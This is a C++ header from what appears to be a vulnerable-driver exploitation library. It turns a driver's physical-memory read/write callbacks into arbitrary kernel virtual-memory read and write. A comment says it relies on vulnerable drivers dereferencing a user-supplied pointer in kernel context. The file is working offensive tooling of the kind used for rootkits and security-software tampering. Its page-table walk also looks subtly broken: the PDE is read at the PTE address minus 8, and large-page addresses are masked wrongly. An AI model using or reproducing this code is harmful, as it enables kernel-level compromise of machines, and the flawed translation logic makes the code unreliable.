#pragma once

#include "common.hpp"

#include <cstddef>
#include <functional>
#include <utility>

namespace vdm
{
    // Driver-independent physical-memory callback contract. Providers receive the
    // physical address as an opaque pointer and must transfer exactly `size` bytes.
    using read_phys_t = std::function<bool( void* address , void* buffer , std::size_t size )>;
    using write_phys_t = std::function<bool( void* address , void* buffer , std::size_t size )>;

    class memory
    {
    public:
        memory( read_phys_t read_physical , write_phys_t write_physical ) : read_physical_( std::move( read_physical ) ) , write_physical_( std::move( write_physical ) ) { }

        bool read_phys( void* address , void* buffer , std::size_t size ) const
        {
            return read_physical_ && read_physical_( address , buffer , size );
        }

        bool write_phys( void* address , void* buffer , std::size_t size ) const
        {
            return write_physical_ && write_physical_( address , buffer , size );
        }

        template <typename T> bool read_phys( uint64_t physical_address , T* output ) const
        {
            return read_phys( reinterpret_cast< void* >( physical_address ) , output , sizeof( T ) );
        }

        template <typename T> bool write_phys( uint64_t physical_address , T* input ) const
        {
            return write_phys( reinterpret_cast< void* >( physical_address ) , input , sizeof( T ) );
        }

        // This primitive expects the provider's write callback to pass `source`
        // through to its driver unchanged. Some vulnerable drivers dereference it
        // in kernel context, allowing the bytes to be staged in a physical slot.
        template <typename T> bool read_virt( uint64_t virtual_address , T* output ) const
        {
            if ( !swap_ )
                return false;
            if ( !write_phys( reinterpret_cast< void* >( swap_ ) , reinterpret_cast< void* >( virtual_address ) , sizeof( T ) ) )
            {
                return false;
            }
            return read_phys( reinterpret_cast< void* >( swap_ ) , output , sizeof( T ) );
        }

        template <typename T> bool write_virt( uint64_t virtual_address , T* input ) const
        {
            if ( !pte_base_ )
                return false;

            uint64_t pte_address = pte_address_for( virtual_address );
            uint64_t pte_value = 0;
            if ( !read_virt<uint64_t>( pte_address , &pte_value ) )
                return false;

            if ( !pte_value )
            {
                uint64_t pde_address = pte_address - 8;
                uint64_t pde_value = 0;
                if ( !read_virt<uint64_t>( pde_address , &pde_value ) )
                    return false;
                if ( !pde_value )
                    return false;
                uint64_t physical = ( ( pde_value >> 12 ) << 12 ) + ( virtual_address & 0x1FFFFF );
                return write_phys( physical , input );
            }

            uint64_t physical = ( ( pte_value >> 12 ) << 12 ) + ( virtual_address & 0xFFF );
            return write_phys( physical , input );
        }

        uint64_t swap_ = 0;
        uint64_t nt_base_ = 0;
        uint64_t pte_base_ = 0;

    private:
        uint64_t pte_address_for( uint64_t virtual_address ) const
        {
            return ( ( virtual_address >> 9 ) & 0x7FFFFFFFF8ULL ) + pte_base_;
        }

        read_phys_t read_physical_;
        write_phys_t write_physical_;
    };
} // namespace vdm
